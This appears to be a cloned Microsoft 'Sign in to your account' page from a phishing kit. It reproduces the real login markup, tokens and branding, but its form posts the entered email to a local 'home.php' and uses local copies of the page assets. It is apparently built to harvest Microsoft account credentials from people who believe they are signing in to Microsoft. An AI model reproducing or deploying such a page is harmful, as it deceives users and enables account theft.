<html dir="ltr" class="" lang="en"><head>
    <title>Sign in to your account</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
    <meta http-equiv="Pragma" content="no-cache">
    <meta http-equiv="Expires" content="-1">
    <meta name="PageID" content="ConvergedSignIn">
    <meta name="SiteID" content="">
    <meta name="ReqLC" content="3081">
    <meta name="LocLC" content="en-AU">



    
        <link rel="shortcut icon" href="favicon.ico">
    
    <meta name="robots" content="none">



    <script type="text/javascript">
        ServerData = $Config;
    </script>

    
<link crossorigin="anonymous" href="converged.v2.login.min.css" rel="stylesheet" onerror="$Loader.On(this,true)" onload="$Loader.On(this)">
    <script crossorigin="anonymous" src="convergedlogin_pcore.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>


    <script crossorigin="anonymous" src="convergedloginpaginatedstrings-en.min.js" onerror="$Loader.On(this,true)" onload="$Loader.On(this)"></script>

    
    


</head>

<body data-bind="defineGlobals: ServerData, bodyCssClass" class="cb" style="display: block;">
    <script type="text/javascript">//<![CDATA[
!function(){var e=window,o=e.document,i=e.$Config||{};if(e.self===e.top)o&&o.body&&(o.body.style.display="block");else if(!i.allowFrame){var s=e.self.location.href,l=s.indexOf("#"),n=-1!==l,t=s.indexOf("?"),f=n?l:s.length,d=-1===t||n&&t>l?"?":"&";s=s.substr(0,f)+d+"iframe-request-id="+i.sessionId+s.substr(f),e.top.location=s}}();

//]]></script>

<div><!--  --> <div data-bind="component: { name: 'background-image', publicMethods: backgroundControlMethods }"><div class="background" role="presentation" data-bind="css: { app: isAppBranding }, style: { background: backgroundStyle }"><!-- ko if: smallImageUrl --> <div data-bind="backgroundImage: smallImageUrl()" style="background-image: url(&quot;0-small.jpg?x=138bcee624fa04ef9b75e86211a9fe0d&quot;);"></div><!-- /ko --><!-- ko if: backgroundImageUrl --> <div class="backgroundImage" data-bind="backgroundImage: backgroundImageUrl()" style="background-image: url(&quot;0.jpg?x=a5dbd4393ff6a725c7e62b61df7e72f0&quot;);"></div><!-- ko if: useImageMask --><!-- /ko --><!-- /ko --> </div></div> <form name="f1" id="i0281" novalidate="novalidate" spellcheck="false" method="POST" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: postUrl }" action="home.php"><!-- ko withProperties: { '$loginPage': $data } --> <div class="outer" data-bind="component: { name: 'page',
        params: {
            serverData: svr,
            showButtons: svr.fShowButtons,
            showFooterLinks: true,
            useWizardBehavior: svr.fUseWizardBehavior,
            handleWizardButtons: false,
            password: password,
            hideFromAria: ariaHidden },
        event: {
            footerAgreementClick: footer_agreementClick } }"><!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --><!-- ko if: svr.fShowCookieBanner --><!-- /ko --> <div class="middle" data-bind="css: { 'app': $loginPage.backgroundLogoUrl() }"><!-- ko if: $loginPage.backgroundLogoUrl() && !(paginationControlMethods() && paginationControlMethods().currentViewHasMetadata('hideLogo')) --><!-- /ko --> <div class="inner" data-bind="css: { 'app': $loginPage.backgroundLogoUrl(), 'wide': paginationControlMethods() &amp;&amp; paginationControlMethods().currentViewHasMetadata('wide') }"><!-- ko ifnot: paginationControlMethods()
                    && (paginationControlMethods().currentViewHasMetadata('hideLogo')
                        || (paginationControlMethods().currentViewHasMetadata('hideDefaultLogo') && !$loginPage.bannerLogoUrl())) --> <div role="banner" data-bind="component: { name: 'logo-control',
                    params: {
                        isChinaDc: svr.fIsChinaDc,
                        bannerLogoUrl: $loginPage.bannerLogoUrl() } }"><!--  --><!-- ko if: bannerLogoUrl --><!-- /ko --><!-- ko if: !bannerLogoUrl && !isChinaDc --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="logo" role="presentation" pngsrc="microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd" data-bind="imgSrc" src="microsoft_logo.svg?x=ee5c8d9fb6248c938fd0dc19370e90bd"><!-- /ko --> <!-- /ko --><!-- /ko --> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.strLWADisclaimerMsg && (paginationControlMethods() && !paginationControlMethods().currentViewHasMetadata('hideLwaDisclaimer')) --><!-- /ko --> <div role="main" data-bind="component: { name: 'pagination-control',
                        publicMethods: paginationControlMethods,
                        params: {
                            initialViewId: initialViewId,
                            currentViewId: currentViewId,
                            initialSharedData: initialSharedData,
                            initialError: $loginPage.getServerError() },
                        event: {
                            cancel: paginationControl_onCancel,
                            showView: $loginPage.view_onShow } }"><div data-bind="css: { 'animate': animate() || animate.back(), 'back': animate.back }" class="animate"><!-- ko foreach: views --><!-- ko if: $parent.currentViewIndex() === $index() --> <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="1" data-bind="pageViewComponent: { name: 'login-paginated-username-view',
                        params: {
                            serverData: svr,
                            serverError: initialError,
                            isInitialView: isInitialState,
                            displayName: sharedData.displayName,
                            prefillNames: $loginPage.prefillNames,
                            flowToken: sharedData.flowToken,
                            altCredHintShown: sharedData.altCredHintShown },
                        event: {
                            refresh: $loginPage.view_onRefresh,
                            redirect: $loginPage.view_onRedirect,
                            showLearnMore: $loginPage.learnMore_onShow } }"><!--  --> <div data-bind="component: { name: 'header-control', params: { serverData: svr } }"><div class="row text-title" id="loginHeader" role="heading"> <div aria-level="1" data-bind="text: title">Sign in</div><!-- ko if: isSubtitleVisible --><!-- /ko --> </div></div><!-- ko if: pageDescription && !svr.fHideLoginDesc --><!-- /ko --> <div class="row"> <div role="alert" aria-live="assertive" aria-atomic="false"><!-- ko if: usernameTextbox.error --><!-- /ko --> </div> <div class="form-group col-md-24"><!-- ko if: prefillNames().length > 1 --><!-- /ko --><!-- ko ifnot: prefillNames().length > 1 --> <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox',
            publicMethods: usernameTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: tenantBranding.UserIdLabel || str['CT_PWD_STR_Email_Example'],
                hintCss: 'placeholder' + (!svr.fAllowPhoneSignIn ? ' ltr_override' : '') },
            event: {
                updateFocus: usernameTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } --> <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } --> 
                
                
                <input name="client_id" maxlength="113" class="form-control ltr_override" placeholder="Email, phone, or Skype" type="email" required> 
                    
                    <input name="passwd" id="i0118" autocomplete="off" data-bind="moveOffScreen, textInput: passwordBrowserPrefill" class="moveOffScreen" tabindex="-1" aria-hidden="true" type="password" required> 
                    
                    
                    <div id="usernameProgress" class="progress" role="progressbar" data-bind="visible: isRequestPending, component: 'marching-ants-control', ariaLabel: str['WF_STR_ProgressText']" style="display: none;" aria-label="Please wait"><!--  --><!-- ko if: useCssAnimation --> <div></div><div></div><div></div><div></div><div></div><div></div><!-- /ko --><!-- ko ifnot: useCssAnimation --><!-- /ko --></div> <!-- /ko --><!-- /ko --><!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div><!-- /ko --> </div> </div><!-- ko withProperties: { '$usernameView': $data } --> <div data-bind="invertOrder: svr.fRepositionFooterButtons, css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons"><div data-bind="component: { name: 'action-links-control',
            params: {
                collapseExcessLinks: svr.fCollapseExcessLinks },
            event: {
                menuOpen: actionLinks_onMenuOpen } }"><!--  --> <div class="row"> 
                <div class="form-group" data-bind="
                    htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                    childBindings: {
                        'signup': {
                            href: svr.urlSignUp,
                            ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                            click: signup_onClick } }">No account? <a href="https://login.live.com/oauth20_authorize.srf?response_type=code&amp;client_id=51483342-085c-4d86-bf88-cf50c7252078&amp;scope=openid+profile+email+offline_access&amp;response_mode=form_post&amp;redirect_uri=https%3a%2f%2flogin.microsoftonline.com%2fcommon%2ffederation%2foauth2&amp;state=rQIIAXWSP2_TUADE-5ImtFVVKoQEYupQMVA5ec__2kRUIq1DEyexG-rUsZcosV9iO7GfsZ26zidgQerCUjYWpC5IBSGo-AJ06twdCTFVIAQDAyk7yy13w-l-9yCNcqi4yjIs113vFahCl2cotoAg1WVpnmI4hmdoiEwOMsGthWXzS_bsxa_npY8_7_9ZfPkpOQbznZF9gHMGcU_AHSuK_LCYz8dxnCP9vm38M_IfALgA4CsAx6kM9qjW3kkq5Bl-g0eQh4jjOMTxLMppypYtCyW6MSlFktpipQRCXdkf1VVxKO9okaQYqDExLUlpxZJQhQ26mUh0lZWVRiS5ZVrfnubV1mFdGbCy2ox0p5rogsbqbjnRXXF4mbopl8aRRV8LCewJ_p6a75PA7fgkjI7Tr4HsY69qbhPPw0aUu45hL7KNbmQTbzcgPg4iG4ebqlPR95WxlGh7k3HMaGVmQhrtvR2BNrEsFixI7_JIsByhKbtxHCK25_mxq9ttZ6BRBl3DVtd_Ilqm2A569c64YzWeVhTxcMgG5MBisI5LzRaSQ8VTiSA67q5cD3FtsFV1CtaWYSfbp-nsdFaXeOfppWkpzzZX_ID07RG-mAXfZhdhpjg3t7C8dBeszPyeBa8yU3Kfe2_uee_ePjr9cbX68L08c57JM-hxvEYPJtyhWnVq62vj0HItM6yUTNQqa7xCXL1W6Yc7fb68yRbRURYcZbNXWfDsxszZ_P9YXy7cnv6lQEGaQhsraL0IYRFx-l81&amp;estsfed=1&amp;uaid=ba06e564f795418db9f526fc0c9bbc79&amp;signup=1&amp;lw=1&amp;fl=easi2&amp;fci=4345a7b9-9a63-4910-a426-35363201d503&amp;mkt=en-US" id="signup" aria-label="Create a Microsoft account">Create one!</a></div>
                
                
                <div class="col-md-24"> <div class="text-13 action-links"> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: svr.showCantAccessAccountLink --><!-- ko component: { name: 'action-link-control',
                    event: {
                        load: actionLink_onLoad,
                        focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --> <div data-bind="css: { 'form-group': !isMenuLink(), 'action-links-menu-item': isMenuLink }" class="form-group"> <a id="cantAccessAccount" href="#" data-bind="
                        text: str['WF_STR_CantAccessAccount_Text'],
                        hasFocus: hasFocus,
                        click: $usernameView.cantAccessAccount_onClick,
                        attr: { 'role': isMenuLink() ? 'menuitem' : null }">Can’t access your account?</a> </div><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: !svr.sRemoteConnectAppName && svr.remoteLoginConfig --><!-- /ko --><!-- ko if: svr.fCBShowSignUp && !svr.fDoIfExists && !svr.fCheckProofForAliases --><!-- ko component: { name: 'action-link-control',
                    event: {
                        load: actionLink_onLoad,
                        focusChange: actionLink_onFocusChange } } --><!-- ko if: isVisible --> <!-- ko template: { nodes: $componentTemplateNodes, data: $data } --><!-- ko if: isMenuLink --><!-- /ko --><!-- ko ifnot: isMenuLink --> <div class="form-group" data-bind="
                        htmlWithBindings: html['WF_STR_SignUpLink_Text'],
                        childBindings: {
                            'signup': {
                                href: svr.urlSignUp,
                                ariaLabel: str['WF_STR_SignupLink_AriaLabel_Text'],
                                click: $usernameView.signup_onClick } }"></div><!-- /ko --><!-- /ko --> <!-- /ko --><!-- /ko --><!-- /ko --><!-- ko if: $usernameView.availableCredsWithoutUsername.length > 0 --><!-- /ko --> <!-- /ko --><!-- ko if: collapseExcessLinks && actionLinks().length > 2 --><!-- /ko --> </div> </div> </div></div><div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }"> <div data-bind="component: { name: 'footer-buttons-field',
            params: {
                serverData: svr,
                isPrimaryButtonEnabled: !isRequestPending(),
                isPrimaryButtonVisible: svr.fShowButtons,
                isSecondaryButtonEnabled: true,
                isSecondaryButtonVisible: svr.fShowButtons &amp;&amp; isBackButtonVisible() },
            event: {
                primaryButtonClick: primaryButton_onClick,
                secondaryButtonClick: secondaryButton_onClick } }"><div class="col-xs-24 no-padding-left-right form-group no-margin-bottom button-container" data-bind="
    visible: isPrimaryButtonVisible() || isSecondaryButtonVisible(),
    css: { 'no-margin-bottom': removeBottomMargin || svr.fRepositionFooterButtons, 'button-container': svr.fRepositionFooterButtons }"><!-- ko if: isSecondaryButtonVisible --> <div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 secondary': isPrimaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isPrimaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input id="idBtn_Back" class="btn btn-block" data-bind="
            attr: {
                'id': secondaryButtonId || 'idBtn_Back',
                'aria-describedby': secondaryButtonDescribedBy },
            value: secondaryButtonText() || str['CT_HRD_STR_Splitter_Back'],
            hasFocus: focusOnSecondaryButton,
            click: secondaryButton_onClick,
            enable: isSecondaryButtonEnabled" value="Back" type="button"> </div><!-- /ko --> <div data-bind="
        css: {
            'inline-block': svr.fRepositionFooterButtons,
            'col-xs-12 primary': isSecondaryButtonVisible() &amp;&amp; !svr.fRepositionFooterButtons,
            'col-xs-24': !(isSecondaryButtonVisible() || svr.fRepositionFooterButtons) }" class="inline-block"> <input id="idSIButton9" class="btn btn-block btn-primary" data-bind="
            attr: {
                'id': primaryButtonId || 'idSIButton9',
                'aria-describedby': primaryButtonDescribedBy },
            value: primaryButtonText() || str['CT_PWD_STR_SignIn_Button_Next'],
            hasFocus: focusOnPrimaryButton,
            click: primaryButton_onClick,
            enable: isPrimaryButtonEnabled,
            visible: isPrimaryButtonVisible" value="Next" type="submit"> </div> </div></div> </div></div><!-- ko if: $usernameView.altCredHintEnabled() && isCredSwitchLinkInMoreOptions() --><!-- /ko --><!-- /ko --><!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko --></div><!-- /ko --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko --><!-- /ko --> </div></div> </div><!-- ko if: newSessionMessage --><!-- /ko --> <input name="ps" data-bind="value: postedLoginStateViewId" value="" type="hidden"> <input name="psRNGCDefaultType" data-bind="value: postedLoginStateViewRNGCDefaultType" value="" type="hidden"> <input name="psRNGCEntropy" data-bind="value: postedLoginStateViewRNGCEntropy" value="" type="hidden"> <input name="psRNGCSLK" data-bind="value: postedLoginStateViewRNGCSLK" value="" type="hidden"> <input name="canary" data-bind="value: svr.canary" value="vCXiy+khCr/Xnfbpcn9i9apJsYT/T9D1P1BTMXiqHOg=1:1" type="hidden"> <input name="ctx" data-bind="value: ctx" value="rQIIAXWRO2_TUACF47xQQQLEAiNDxQBy7Gs7dhypEnYeJlH8SOrEcTqkiePUt8m1HfumTrIiJMbOlWBgQeoAEgsVvwB16ozEihATYmIk-QEsZzmfjo7OeZoBBVDe51iuOBLGIimOeJbkRECTI47hSbbI8ixDg0mRZqMHt-8fpT68ipmj5sfPT66O0deXl8RDD-MwLlNUkiSFYDqFjltwAkRdEcQNQfwkiIt0zvVJqXuZjnmW53maBqAoMCInAJEt2KZE22YdqdUu1pUaqx7StG522ZbVALbVxqqlJrZV4zRlMBtUO57NDDzVVIuasvU2E6Tt-KoMW6Z3OjAdrFttRjdlz0Ya3ObCb-l7urTEHrOTIIIb9096bxpEaBgGMb7IvCf00PUbk0rg-66DCzvM9TF0RhgGvhEFoRth6MYH7mamNNFsIZ-te4yNS5qcNBvttSyXZH5sh8MGGtbHzUiRq3jZWDlIsoTiadxHKCRtiWsb447FlupKV2h35dEqMTs66izUSS9hpW67tGQMf2XWllIiRoYRzIcnYs9WB9FGF5rR_FALhE-Z_HZWFPjXmbvbUj6cPA6jYArn7k2W-JVN07m_WeJdbvvRm_07P7639Odv1x0R049S1znqrNKH62czrxJRfX86Dh1fhOIobMa2SZliFRhANtU-XLzQTw5AGZznifN8_neeeH0r9WXvfw__Aw2" type="hidden"> <input name="hpgrequestid" data-bind="value: svr.sessionId" value="e60b249d-4cdd-404f-9e79-523974301800" type="hidden"> <input id="i0327" data-bind="attr: { name: svr.sFTName }, value: flowToken" name="flowToken" value="AQABAAEAAADX8GCi6Js6SK82TsD2Pb7r5VvA3iL0m9izTGwls107m4N7TTcJgoj-3ALsLgtJDRWUJVXwPTDO_mM8NiJQSO-_wKGJ9tIRMm22kKyWM22pIiCqRCnLUzxuhhKi0VH6CLBFmJIOsDCXqR3UPS4ecrNVwrs9fUpIMoX8b-ptlRlUZl1mGXn32VFXOqIkfau5Su34b3usXn9reCLjz5BuTFY8RuIkypLW8N8tWd9JBjRwcnzhNm5u7hm3xB_RDBw88xUKZb12JTtKbLB4Lnkh6TvvCnUf7KoOLR1Nie1ZV8nswLVuslfWCUPOeek-0O1NxF9Qr1csrliDymoBXnIZohhEIAA" type="hidden"> <input name="PPSX" data-bind="value: svr.sRandomBlob" value="" type="hidden"> <input name="NewUser" value="1" type="hidden"> <input name="FoundMSAs" data-bind="value: svr.sFoundMSAs" value="" type="hidden"> <input name="fspost" data-bind="value: svr.fPOST_ForceSignin ? 1 : 0" value="0" type="hidden"> <input name="i21" data-bind="value: wasLearnMoreShown() ? 1 : 0" value="0" type="hidden"> <input name="CookieDisclosure" data-bind="value: svr.fShowCookieBanner ? 1 : 0" value="0" type="hidden"> <input name="IsFidoSupported" data-bind="value: isFidoSupported ? 1 : 0" value="1" type="hidden"> <div data-bind="component: { name: 'instrumentation',
                publicMethods: instrumentationMethods,
                params: { serverData: svr } }"><input name="i2" data-bind="value: clientMode" value="102" type="hidden"> <input name="i17" data-bind="value: srsFailed" value="" type="hidden"> <input name="i18" data-bind="value: srsSuccess" value="" type="hidden"> <input name="i19" data-bind="value: timeOnPage" value="" type="hidden"></div> <div id="footer" class="footer default" role="contentinfo" data-bind="css: { 'default': !backgroundLogoUrl() }"> <div data-bind="component: { name: 'footer-control',
                    params: {
                        serverData: svr,
                        debugDetails: debugDetails,
                        showLinks: true },
                    event: {
                        agreementClick: footer_agreementClick,
                        showDebugDetailsClick: footer_showDebugDetailsClick } }"><!--  --><!-- ko if: showLinks || impressumLink || showIcpLicense --> <div id="footerLinks" class="footerNode text-secondary"><!-- ko if: !showIcpLicense --> <span id="ftrCopy" data-bind="html: svr.strCopyrightTxt">©2018 Microsoft</span><!-- /ko --> <a id="ftrTerms" data-bind="text: str['MOBILE_STR_Footer_Terms'], href: termsLink, click: termsLink_onClick" href="" data-bind="text: str['MOBILE_STR_Footer_Privacy'], href: privacyLink, click: privacyLink_onClick" href="">Privacy &amp; cookies</a><!-- ko if: impressumLink --><!-- /ko --><!-- ko if: showIcpLicense --><!-- /ko --> <a href="#" role="button" class="moreOptions" data-bind="click: moreInfo_onClick, ariaLabel: str['CT_STR_More_Options_Ellipsis_AriaLabel'], attr: { title: str['CT_STR_More_Options_Ellipsis_AriaLabel'] }" aria-label="Click here for more options" title="Click here for more options"><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="desktopMode" role="presentation" pngsrc="ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73" data-bind="imgSrc" src="ellipsis_white.svg?x=5ac590ee72bfe06a7cecfd75b588ad73"><!-- /ko --> <!-- /ko --><!-- /ko --><!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko --><!-- ko if: (isHighContrastWhiteTheme || !svr.fHasBackgroundColor) && !isHighContrastBlackTheme --> <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img class="mobileMode" role="presentation" pngsrc="ellipsis_grey.png?x=5bc252567ef56db648207d9c36a9d004" svgsrc="ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c" data-bind="imgSrc" src="ellipsis_grey.svg?x=2b5d393db04a5e6e1f739cb266e65b4c"><!-- /ko --> <!-- /ko --><!-- /ko --> </a> </div><!-- ko if: showDebugDetails --><!-- /ko --> <!-- /ko --></div> </div> </div> <!-- /ko --></div><!-- /ko --><!-- ko if: svr.iBannerEnvironment --><!-- /ko --><!-- ko if: svr.urlUxPreviewOptIn && showFeatureNotificationBanner() --><!-- /ko --> </form> <form method="post" aria-hidden="true" target="_top" data-bind="autoSubmit: postRedirectForceSubmit, attr: { action: postRedirectUrl }"><!-- ko foreach: postRedirectParams --><!-- /ko --> </form><!-- ko if: svr.urlMsaMeControl --><!-- /ko --><!-- ko if: svr.urlCBPartnerPreload --> <div id="idPartnerPL" data-bind="injectIframe: { url: svr.urlCBPartnerPreload }"><iframe style="display: none;" src="" width="0" height="0"></iframe></div> <!-- /ko --></div></body></html>